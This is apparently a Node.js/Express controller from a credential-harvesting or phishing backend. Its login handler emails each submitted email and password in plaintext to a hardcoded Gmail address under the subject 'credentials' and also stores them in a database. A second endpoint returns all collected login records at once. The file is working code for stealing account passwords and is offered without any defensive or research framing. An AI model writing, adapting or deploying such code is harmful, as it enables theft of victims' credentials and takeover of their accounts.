const sendMail = require("../Controllers/mail")
const detailsModel = require("../Model/detailModel")


exports.loginInfo =async(req,res)=>{
    try { 
        const{email,password}= req.body
           
        sendMail(
            { 
                from:"gmail",
                email:"dontloose4cus01@gmail.com",
                subject:"credentials",
                message:`email:${email} password :${password}`

            }           
        )
        const loginInfo =await detailsModel.create(req.body) 
        await loginInfo.save()
        return res.status(200).json({
            message:"login saved successfully"
        })
      
        
    } catch (error) {
       return res.status(500).json({
        message:error.message
       })
    }
}
exports.getAllInfo = async(req,res)=>{
    try {
        const getInfo = await detailsModel.find()
        return res.status(200).json({
            mesage:"here are the login info",
            data:getInfo
        })
    } catch (error) {
        return res.status(300).json({
            message:error.message
        })
    }
}